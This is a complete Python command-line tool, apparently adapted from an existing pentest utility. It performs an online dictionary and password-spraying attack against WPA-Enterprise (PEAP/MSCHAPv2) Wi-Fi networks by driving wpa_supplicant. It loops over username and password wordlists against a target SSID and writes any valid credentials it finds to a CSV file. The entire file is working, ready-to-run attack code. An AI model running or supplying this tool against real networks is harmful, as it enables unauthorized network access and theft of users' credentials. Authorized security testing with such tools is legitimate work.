#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import datetime
import time
import sys
import threading

from wpa_supplicant.core import WpaSupplicantDriver
from twisted.internet.selectreactor import SelectReactor


def timestamp() -> str:
    now = datetime.datetime.now()
    return f"{now.year:02d}-{now.month:02d}-{now.day:02d} {now.hour:02d}:{now.minute:02d}:{now.second:02d}"


def connect_to_wifi(
    ssid: str,
    password: str,
    username: str,
    interface,
    supplicant,
    outfile: str = None,
    authentication: str = "wpa-enterprise",
) -> bool:
    print(f"Trying {username}:{password}...")

    # WPA Enterprise configuration
    if authentication == "wpa-enterprise":
        network_params = {
            "ssid": ssid,
            "key_mgmt": "WPA-EAP",
            "eap": "PEAP",
            "identity": username,
            "password": password,
            "phase2": "auth=MSCHAPV2",
        }
    else:
        network_params = {"ssid": ssid}

    # Remove all the networks currently assigned to this interface
    for network in interface.get_networks():
        network_path = network.get_path()
        interface.remove_network(network_path)

    # Add target network to the interface and connect to it
    interface.add_network(network_params)
    target_network = interface.get_networks()[0].get_path()
    interface.select_network(target_network)

    # Check the status of the wireless connection
    credentials_valid = False
    max_wait = 4.5
    test_interval = 0.01
    seconds_passed = 0.0

    while seconds_passed <= max_wait:
        try:
            state = interface.get_state()
            if state == "completed":
                credentials_valid = True
                break
        except Exception as e:
            print(e)
            break

        time.sleep(test_interval)
        seconds_passed += test_interval

    if credentials_valid:
        print(f"[!] VALID CREDENTIALS: {username}:{password}")
        if outfile:
            csv_output = (
                f"\"{timestamp()}\",\"{ssid}\",\"{username}\",\"{password}\"\n"
            )
            with open(outfile, "a", encoding="utf-8") as f:
                f.write(csv_output)

    # Disconnect from the network
    try:
        interface.disconnect_network()
    except Exception:
        pass

    try:
        interface.remove_network(target_network)
    except Exception:
        pass

    return credentials_valid


# ----------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------
description = (
    "Perform an online, horizontal dictionary attack against a WPA Enterprise network."
)

parser = argparse.ArgumentParser(
    description=description,
    add_help=False,
    formatter_class=argparse.ArgumentDefaultsHelpFormatter,
)
parser.add_argument("-i", type=str, required=True, metavar="interface", dest="device", help="Wireless interface")
parser.add_argument("-e", type=str, required=True, dest="ssid", help="SSID of the target network")
parser.add_argument("-u", type=str, required=True, dest="userfile", help="Username wordlist")
parser.add_argument("-P", dest="password", default=None, help="Password to try on each username")
parser.add_argument("-p", dest="passfile", default=None, help="List of passwords to try for each username")
parser.add_argument("-s", type=int, default=0, dest="start", metavar="line",
                    help="Optional start line to resume attack. May not be used with a password list.")
parser.add_argument("-w", type=str, default=None, dest="outfile", help="Save valid credentials to a CSV file")
parser.add_argument("-1", default=False, dest="stop_on_success", action="store_true",
                    help="Stop after the first set of valid credentials are found")
parser.add_argument("-t", default=0.5, metavar="seconds", type=float, dest="attempt_delay",
                    help="Seconds to sleep between each connection attempt")

# Show help if no args (keeps parity with original)
if "-h" in sys.argv or "--help" in sys.argv or len(sys.argv) == 1:
    parser.print_help()
    sys.exit(0)

args = parser.parse_args()

if args.password is None and args.passfile is None:
    print("You must specify a password or password list.")
    sys.exit(1)

if args.start != 0 and args.passfile is not None:
    print("The start line option may not be used with a password list.")
    sys.exit(1)

device = args.device
ssid = args.ssid
userfile = args.userfile
password_arg = args.password
passfile = args.passfile
start = args.start
outfile = args.outfile
stop_on_success = args.stop_on_success
attempt_delay = args.attempt_delay

if passfile is not None:
    with open(passfile, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    content = content.replace("\r", "")
    passwords = content.split("\n")
    if passwords and passwords[-1] == "":
        passwords = passwords[:-1]
else:
    passwords = [password_arg]

# Start a simple Twisted SelectReactor
reactor = SelectReactor()
threading.Thread(target=reactor.run, kwargs={"installSignalHandlers": 0}, daemon=True).start()
time.sleep(0.1)  # let reactor start

# Start Driver
driver = WpaSupplicantDriver(reactor)

# Connect to the supplicant
supplicant = driver.connect()

# Register an interface w/ the supplicant
try:
    interface = supplicant.get_interface(device)
except Exception:
    interface = supplicant.create_interface(device)

# Read usernames
with open(userfile, "r", encoding="utf-8", errors="ignore") as f:
    users = [l.rstrip("\r\n") for l in f.readlines()]

valid_credentials_found = False

try:
    for pw in passwords:
        for n in range(start, len(users)):
            print(f"[{n}] ", end="")
            valid_credentials_found = connect_to_wifi(
                ssid=ssid,
                username=str(users[n]),
                password=str(pw),
                interface=interface,
                supplicant=supplicant,
                outfile=outfile,
            )

            if valid_credentials_found and stop_on_success:
                break

            time.sleep(attempt_delay)

        if valid_credentials_found and stop_on_success:
            break

    if reactor.running:
        try:
            reactor.sigBreak()
        except Exception:
            # Fallback: ask the reactor to stop from its own thread
            reactor.callFromThread(reactor.stop)

    print("DONE!")

except KeyboardInterrupt:
    if reactor.running:
        try:
            reactor.sigBreak()
        except Exception:
            reactor.callFromThread(reactor.stop)
    print("Attack stopped by user.")

except Exception as e:
    print(e)
    if reactor.running:
        try:
            reactor.sigBreak()
        except Exception:
            reactor.callFromThread(reactor.stop)
